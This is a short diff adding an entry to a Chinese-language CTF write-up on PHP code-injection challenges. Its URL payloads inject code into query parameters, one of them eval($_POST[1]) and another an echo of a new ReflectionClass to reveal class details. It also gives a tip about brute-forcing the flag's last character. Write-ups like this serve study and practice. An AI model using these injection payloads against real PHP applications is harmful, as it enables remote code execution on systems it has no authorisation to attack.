@@ -158,6 +158,14 @@ pyload=`URL/?v1=1&v2=eval($_POST[1])?>&v3=;`
 
 把`0x2d`--->`-`
 
+**·101**
+![4](TU/PHP4x14.png)
+
+**[ReflectionClass 类](https://www.php.net/manual/zh/class.reflectionclass.php)**:报告了一个类的有关信息。
+
+?v1=1&v2=echo new Reflectionclass&v3=;
+
+把0x2d替换为-,最后一位需要爆破16次，题目给的flag少一位
 
 
 
